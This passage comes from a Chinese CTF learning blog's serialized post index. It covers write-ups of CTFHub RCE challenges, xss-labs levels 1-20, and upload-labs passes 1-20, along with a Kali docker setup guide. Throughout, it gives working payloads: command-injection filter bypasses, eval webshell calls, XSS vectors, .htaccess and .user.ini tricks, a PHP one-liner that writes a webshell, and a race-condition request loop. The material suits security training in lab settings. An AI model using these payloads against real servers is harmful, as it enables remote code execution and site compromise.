系统必须要定位然后加载它所需要的所有动态库文件 在 Linux 环境下，这项工作是由 ld-linux.so.2 来负责完成的 执行操作时操作系统会将控制权交给 ld-linux.so 而不是交给程序正常的进入地址 ld-linux.so.2 会寻找然后加载所有需要的库文件，然后再将控制权交给应用的起始入口。 ldd 命令 使用 ldd 命令即可查看 简便的 shell 命令依赖哪些动态加载库 姿势 在 cat elf 文件时 看到第一行后面/lib64/ld-linux-x86-64.so.2 动态库 并且在 ldd 可以看到 ls 和 cat 动用他了 用！ 这是他的介绍 执行 1/lib64/ld-linux-x86-64.so.2 /readflag get","categories":[{"name":"web","slug":"web","permalink":"https://s1rius.space/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://s1rius.space/tags/web/"},{"name":"ctfhub","slug":"ctfhub","permalink":"https://s1rius.space/tags/ctfhub/"},{"name":"linux","slug":"linux","permalink":"https://s1rius.space/tags/linux/"},{"name":"动态加载","slug":"动态加载","permalink":"https://s1rius.space/tags/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/"}],"author":"s1rius"},{"title":"ctfhub-rce","slug":"ctfhub-rce","date":"2022-04-01T16:00:00.000Z","updated":"2022-04-01T16:00:00.000Z","comments":true,"path":"2022/04/ctfhub-rce/","permalink":"https://s1rius.space/2022/04/ctfhub-rce/","excerpt":"","text":"rce：远程代码执行漏洞 分为远程命令执行 ping 和远程代码执行 evel。 其实这就是一个接口，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是 RCE 漏洞。相当于直接操控服务器电脑的 cmd 命令行！高危漏洞！ eval 执行 12345678&lt;?php if(isset($_REQUEST[&#39;cmd&#39;])){ eval($_REQUEST[&#39;cmd&#39;]); } else{ highlight_file(__FILE__); } ?&gt; 传参给 cmd 来 eval 1/?cmd=system(&quot;ls /&quot;);//此处因为根目录无flag 所以看上一级目录 找到后 再 cat /flag_**** 文件包含 这里使用 strpos 函数 strpos:查找字符串首次出现的位置 int strpos ( string $haystack , mixed $needle [, int $offset = 0 ] ) 题目使用 123if(!strpos($_GET[&quot;file&quot;],&quot;flag&quot;)){//无flag字符即可运行 include $_GET[&quot;file&quot;]; } 来包含文件，而下方给出的 shell.txt 含有 eval 漏洞 于是包含它（shell.txt 没有“flag”字符 所以这里 strpos 没影响） 通过 get(包含文件) post(传参)并用来得到 flag php info 1234567891011&lt;?php if (isset($_GET[&#39;file&#39;])){ if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) { include($_GET[&quot;file&quot;]); } else { echo &quot;Hacker!!!&quot;; }} else { highlight_file(__FILE__);}?&gt; &lt;hr&gt;i don&#39;t have shell, how to get flag? &lt;br&gt;&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt; 点击 phpinfo 链接 可查看 php 环境 php://input 12345/*php:// — 访问各个输入/输出流（I/O streams） PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。 php://input是个可以访问请求的原始数据的只读流。 读取源代码 看环境 无法使用 php://input 123456789101112&lt;?php error_reporting(E_ALL); if (isset($_GET[&#39;file&#39;])) { if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) { include($_GET[&quot;file&quot;]); } else { echo &quot;Hacker!!!&quot;; } } else { highlight_file(__FILE__); } ?&gt; 但还必须是 php://开头 php://filter 远程包含 同 phpinfo 做法相同 命令注入 输入命令 1127.0.0.1;ls 然后 cat 时出现了问题 输出被限制了 于是用管道符号来限制输出 base64 得到后再解码 过滤 cat 123456789101112131415161718192021222324252627&lt;?php $res = FALSE; if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) { $ip = $_GET[&#39;ip&#39;]; $m = []; if (!preg_match_all(&quot;/cat/&quot;, $ip, $m)) {//过滤了cat $cmd = &quot;ping -c 4 {$ip}&quot;; exec($cmd, $res); } else { $res = $m; } } ?&gt; &lt;pre&gt; &lt;?php if ($res) { print_r($res); } ?&gt; &lt;/pre&gt; &lt;?php show_source(__FILE__); ?&gt; &lt;/body&gt; &lt;/html&gt; more Linux more 命令类似 cat ，不过会以一页一页的形式显示，更方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示，而且还有搜寻字串的功能（与 vi 相似），使用中的说明文件，请按 h 。 1more [-dlfpcsu] [-num] [+/pattern] [+linenum] [fileNames..] 过滤空格 在 linux 里空格可用&lt; 或 ${IFS}代替 过滤运算符 cat [file]|base64 还可以用 base64 [file] 12345678910111213&lt;?php $res = FALSE; if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) { $ip = $_GET[&#39;ip&#39;]; $m = []; if (!preg_match_all(&quot;/(\\||\\&amp;)/&quot;, $ip, $m)) { $cmd = &quot;ping -c 4 {$ip}&quot;; exec($cmd, $res); } else { $res = $m; } } ?&gt; 综合练习 1!preg_match_all(&quot;/(\\||&amp;|;| |\\/|cat|flag|ctfhub)/&quot;, $ip ;可以用%0a(url 编码) cat 用 base64 flag 用正则 f*** *lag 等 空格用 ${IFS}","categories":[{"name":"web","slug":"web","permalink":"https://s1rius.space/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://s1rius.space/tags/web/"},{"name":"ctfhub","slug":"ctfhub","permalink":"https://s1rius.space/tags/ctfhub/"},{"name":"rce","slug":"rce","permalink":"https://s1rius.space/tags/rce/"}],"author":"s1rius"},{"title":"xss-lab","slug":"xsslab","date":"2022-03-19T16:00:00.000Z","updated":"2022-03-19T16:00:00.000Z","comments":true,"path":"2022/03/xsslab/","permalink":"https://s1rius.space/2022/03/xsslab/","excerpt":"","text":"level 1 没啥好说的 直接 alert level 2 12345&lt;input name=keyword value=&quot;test&quot;&gt; //改后是 &lt;input name=keyword value=&quot;1111&quot;&gt;&lt;script&gt;……&gt;// 1111&quot;&gt;&lt;script&gt;……这是输入的部分 前后闭合 level 3 用了 htmlspeialchars()函数 &lt;&gt;&quot;都被过滤 二者都写可以 level 4 和上面一样 level 5 on 和 script 都被过滤 这里用 javascript:伪协议 出来的链接就是答案 level 6 可以大小写绕过 level 7 把特殊字符便空了 可以双写绕过 level 8 这关卡的死死的 要编码绕过 level 9 strpos 函数看是否有 http:// 验证是否为安全连接 但是没有限定位置 要编码下 还要把 http://放最后面用//注释掉 level 10-13 页面没有注入点 看源代码发现隐藏的表单 要改为文本框 text 1type=&quot;text&quot; onclick=&quot;alert(1)&quot; 后面几关都要改 t_sort 因为后端获取 t_sort 和 user-agent 等 要从相应注入点注入 level 14 exif xss 漏洞，exif 是可交换图像文件格式（英语：Exchangeable image file format，官方简称 Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。我们右键图片选择属性，点击详细信息就可以看到 exif 的相关属性。 喜欢摄影的应该都知道一张照片可以看快门时间 快门次数等很多参数 甚至有些照片能看到经纬度 这关要用到 exifviewer网页 但是 &gt; level 15 level 16 对 script、/、空格进行了转换 空格不可以就用换行符 1&lt;a%0atype=&quot;text&quot;%0a&quot;alert&quot;&gt; level 17-18 火狐不支持 swf 格式 把链接加网页上显示出这样 很奇怪 开始整套娃了 要找个支持 flash 的浏览器才能正常打开 17-20 关都能用 flash xss flash xss 原理 但这里先用别的办法 以 18 关为例 注入点可以在 arg02 但是你连 swf 都没有哪来的 moouseover 哪 所以得 url 连接一下 1http://127.0.0.1/xss-labs/level18.php/xsf02.swf?a=?arg01=a&amp;arg02=%20onmouseover=javascript:alert(1) level 19-20 Flash XSS 漏洞快速上手 flash xss 原理 flash 反编译工具 以下是大佬的 payload 卑微小杨在线 emo flash 反编译也不懂 等有空了再研究吧 好多困难等着被克服那 这次没支持 flash 的浏览器真没法做 18 关 1http: //10.0.1.83/xsslab/level19.php?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(/bmfx/)&quot;&gt;bmfx&lt;/a&gt; ; 19 关 1http: ; //10.0.1.83/xsslab/level20.php?arg01=id&amp;arg02=bmfx\\&quot;))}catch(e){alert(/bmfx/)}//%26width=998%26height=998 setTimeout(function () { alert('xss'); }, 1000);","categories":[{"name":"web","slug":"web","permalink":"https://s1rius.space/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://s1rius.space/tags/web/"},{"name":"xss","slug":"xss","permalink":"https://s1rius.space/tags/xss/"},{"name":"xss-lab","slug":"xss-lab","permalink":"https://s1rius.space/tags/xss-lab/"}],"author":"s1rius"},{"title":"kali安装docker","slug":"docker","date":"2022-03-09T16:00:00.000Z","updated":"2022-03-09T16:00:00.000Z","comments":true,"path":"2022/03/docker/","permalink":"https://s1rius.space/2022/03/docker/","excerpt":"","text":"kali 安装 docker 12345678apt-get update apt-get install docker-engine ## 安装结束，打开docker服务 service docker start ## 验证安装，运行测试样例 docker --version docker run hello-world #测试 docker 常用命令 12345docker --version docker images docker ps -a docker run -d --name 123 -p 127.0.0.1:80:80 镜像名 docker stop 123 其他常用命令见菜鸟教程 dockers 底层原理 Namespaces 命名空间是 Linux 为我们提供的用于分离进程树、网络接口、挂载点以及进程间通信等资源的方法。在日常使用 Linux 时，我们并没有运行多个完全分离的服务器的需要，但是如果我们在服务器上启动了多个服务，这些服务其实会相互影响的，每一个服务都能看到其他服务的进程，也可以访问宿主机器上的任意文件，这是很多时候我们都不愿意看到的，我们更希望运行在同一台机器上的不同服务能做到完全隔离，就像运行在多台不同的机器上一样。 CGroups 我们通过 Linux 的命名空间为新创建的进程隔离了文件系统、网络并与宿主机器之间的进程相互隔离，但是命名空间并不能够为我们提供物理资源上的隔离，比如 CPU 或者内存，如果在同一台机器上运行了多个对彼此以及宿主机器一无所知的『容器』，这些容器却共同占用了宿主机器的物理资源。 如果其中的某一个容器正在执行 CPU 密集型的任务，那么就会影响其他容器中任务的性能与执行效率，导致多个容器相互影响并且抢占资源。如何对多个容器的资源使用进行限制就成了解决进程虚拟资源隔离之后的主要问题，而 Control Groups（简称 CGroups）就是能够隔离宿主机器上的物理资源，例如 CPU、内存、磁盘 I/O 和网络带宽。 在 CGroup 中，所有的任务就是一个系统的一个进程，而 CGroup 就是一组按照某种标准划分的进程，在 CGroup 这种机制中，所有的资源控制都是以 CGroup 作为单位实现的，每一个进程都可以随时加入一个 CGroup 也可以随时退出一个 CGroup。","categories":[{"name":"教程","slug":"教程","permalink":"https://s1rius.space/categories/%E6%95%99%E7%A8%8B/"}],"tags":[{"name":"web","slug":"web","permalink":"https://s1rius.space/tags/web/"},{"name":"kali","slug":"kali","permalink":"https://s1rius.space/tags/kali/"},{"name":"docker","slug":"docker","permalink":"https://s1rius.space/tags/docker/"}],"author":"s1rius"},{"title":"upload-labs","slug":"upload-labs","date":"2022-03-02T16:00:00.000Z","updated":"2022-03-02T16:00:00.000Z","comments":true,"path":"2022/03/upload-labs/","permalink":"https://s1rius.space/2022/03/upload-labs/","excerpt":"","text":"pass-01 前端 js 过滤 123456789101112131415161718192021function checkFile() { var file = document.getElementsByName(&quot;upload_file&quot;)[0].value; if (file == null || file == &quot;&quot;) { alert(&quot;请选择要上传的文件!&quot;); return false; } //定义允许上传的文件类型 var allow_ext = &quot;.jpg|.png|.gif&quot;; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) { var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); return false; } } 最简单的 burp 抓包改后缀 pass-02 12345678910111213141516171819$is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/gif&#39;)) { $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;] if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = &#39;上传出错！&#39;; } } else { $msg = &#39;文件类型不正确，请重新上传！&#39;; } } else { $msg = UPLOAD_PATH.&#39;文件夹不存在,请手工创建！&#39;; } } 用 if 函数结合$_FILES['myfile']['type']判断 MIME 类型 后端改 content-type 将application/octect-stream变为image/jpeg、image/png或image/gif pass-03 123456789101112131415161718192021222324252627$is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = &#39;上传出错！&#39;; } } else { $msg = &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } 他经过了许多步 但其实他只匹配了$deny_ext = array('.asp','.aspx','.php','.jsp'); 修改为 php1，php2，php3，php4，php5，phtml 等 与 php 解析相同的后缀皆可 pass-04 123456789101112131415161718192021222324252627$is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = &#39;上传出错！&#39;; } } else { $msg = &#39;此文件不允许上传!&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } 这回匹配的倒挺多 不过配置文件没过滤 上传.htaccess 文件 写入下面两句中的一句即可 第一句是全按 php 解析 第二句是将 jpg 按 php 解析 12SetHandler application/x-httpd-php AddType application/x-https-php .jpg pass-05 和第 4 关类似 写入.user.ini 文件 1auto_prepend_file=shell.jpg 再配合 shell pass-06 这一关源码补上了之前漏网的配置文件 但是这里可以使用大小写绕过 例如.Php pass-07 这里补了一句 1$file_ext = strtolower($file_ext); //转换为小写 没法大小写绕过了 这里通过补空格来绕过 .php (空格) pass-08 这里补了句首位去空 1$file_ext = trim($file_ext); //首尾去空 这次用 . 绕过 .php. 和上面一样 后面的空格和 . 会被服务器自动删除 pass-09 这里补了 1$file_name = deldot($file_name);//删除文件名末尾的点 比之前少了一句 1$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA 使用 1.php::$DATA pass-10 这里补回了::$DATA 仔细看这里过滤的顺序 1234567$deny_ext=array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 仔细看这里过滤的顺序 先去的点然后去的空 于是可以 .php. . 过滤后剩下 .php. pass-11 12345678910111213141516171819$is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;,&quot;ini&quot;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = &#39;上传出错！&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } 这里用 trim 函数删去通过$_FILES['upload_ext']['tmp_name']得到的浏览器通过报文传过来的在 burpsuite 中的变量名是 filename 的字符串左右两边的空格 这就省了几步过滤 但是下面这句 $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); 是匹配到黑名单后替换成空 于是这里可以双写绕过 .pphphp pass-12 这次使用了白名单过滤 123456789101112131415161718$is_upload = false; $msg = null; if(isset($_POST[&#39;submit&#39;])){ $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &#39;上传出错！&#39;; } } else{ $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; } } 讲一下 00 截断的原理，在服务器读到十六进制编码为 00 时就会停止读取，而 save_path 是通过 GET 传参的 00 的 GET 传参的数据最终都会经过 URL 解码而%00 解码之后就是十六进制对应的 00，这就导致 move_uploaded_file 函数会读到 00 就结束从而上传成功 .php%00 pass-13 代码和十二关一样，只是 save_path 改用 POST 传参了 burpsuite 自带的 16 进制编辑器改 16 进制 找到文件名后缀后面的 0 被改为 00 pass-14 1234567891011121314151617181920212223242526272829303132333435363738394041function getReailFileType($filename){ $file = fopen($filename, &quot;rb&quot;);//以只读 二进制方式打开 $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin);//从二进制字符串对数据进行解包 //&#39;C2char&#39;的意思是二进制文件类型是&#39;unsigned char&#39;转换为char类型最终返回值是一个数组。之后将数组返还给$strinfo函数。 $typeCode = intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]);//将$strinfo中的每一个元素转变为int型并且拼接输出给 $typeCode $fileType = &#39;&#39;; switch($typeCode){//switch匹配 case 255216: $fileType = &#39;jpg&#39;; break; case 13780: $fileType = &#39;png&#39;; break; case 7173: $fileType = &#39;gif&#39;; break; default: $fileType = &#39;unknown&#39;; } return $fileType; } $is_upload = false; $msg = null; if(isset($_POST[&#39;submit&#39;])){ $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $file_type = getReailFileType($temp_file); if($file_type == &#39;unknown&#39;){ $msg = &quot;文件未知，上传失败！&quot;; }else{ $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;上传出错！&quot;; } } } 这里本质上是检验的文件头 只要做个文件头正确的图片 🐎 即可 pass-15 1234567891011121314function isImage($filename){ $types = &#39;.jpeg|.png|.gif&#39;; if(file_exists($filename)){ $info = getimagesize($filename);//获取文件信息 $ext = image_type_to_extension($info[2]);//返回文件后缀 if(stripos($types,$ext)&gt;=0){ return $ext; }else{ return false; } }else{ return false; } } 这里上传图片 🐎 即可 pass-16 1$image_type = exif_imagetype($filename); 这里的函数替代 15 关的 12$info = getimagesize($filename);//获取文件信息 $ext = image_type_to_extension($info[2]);//返回文件后缀 还是图片 🐎 即可 pass-17 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384$is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])){ // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $filetype = $_FILES[&#39;upload_file&#39;][&#39;type&#39;]; $tmpname = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $target_path=UPLOAD_PATH.&#39;/&#39;.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,&quot;.&quot;),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false){ $msg = &quot;该文件不是jpg格式的图片！&quot;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.jpg&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = &quot;上传出错！&quot;; } }else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false){ $msg = &quot;该文件不是png格式的图片！&quot;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.png&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = &quot;上传出错！&quot;; } }else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false){ $msg = &quot;该文件不是gif格式的图片！&quot;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.gif&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = &quot;上传出错！&quot;; } }else{ $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;; } } 这里进行了许多步过滤 简单总结下主要的就是 对 gif、png 或 jpg 文件的格式进行二次渲染 根据上传的文件类型用 imagecreatefromgif 这一类的函数生成一个新的图片 将原本保存下的文件用 unlink 函数删除 据师傅说直接用 cmd 命令行 copy 的文件也能成功上传 也可以用 010editor 比较二次渲染前后的图片 蓝色的部分是未被改变的 可以在那里插入 🐎 pass-18 1234567891011121314151617181920212223$is_upload = false; $msg = null; if(isset($_POST[&#39;submit&#39;])){ $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1); $upload_file = UPLOAD_PATH . &#39;/&#39; . $file_name; if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; unlink($upload_file); } }else{ $msg = &#39;上传出错！&#39;; } } 这里过滤的挺充分的 不过黑客大佬们还是有方法 原理简单来说是 文件上传后到原文件被删除有一段时间 利用这段时间 重复发送写入木马的木马 然后不停访问原文件 访问成功后 木马也就被重新写入 写入木马的木马 1&lt;?php puts(fopen(&#39;shell.php&#39;,&#39;r+&#39;),&#39;&lt;? @eval($_POST[&#39;shell&#39;]);?&gt;&#39;);?&gt;//发送的木马 重复发送利用 burp 实现 用 burpsuite 抓包 调用 intruder 模块 打开 payload 板块设置 payload type 为 null payloads 点击下方的 continue indefinitely 连续访问利用脚本实现 123456789import requests url = &quot;http://ip/upload-labs/upload/shell.php&quot; while True: html = requests.get(url) if html.status_code == 200: print(&quot;success&quot;) break else print(&quot;200&quot;) pass-19 这一关和上面很像 不过 python 连续访问的 url 要变成 1127.0.0.1/upload-labs-master/include.php?file=upload/shell.jpg pass-20 这关绕过方法用之前的.php.就可以 不过这关和之前有个很明显的区别 做了个保存名称的 input 12345678910111213141516171819202122232425$is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = $_POST[&#39;save_name&#39;]; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);//在这里 if(!in_array($file_ext,$deny_ext)) { $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; }else{ $msg = &#39;上传出错！&#39;; } }else{ $msg = &#39;禁止保存为该类型文件！&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } pass-21 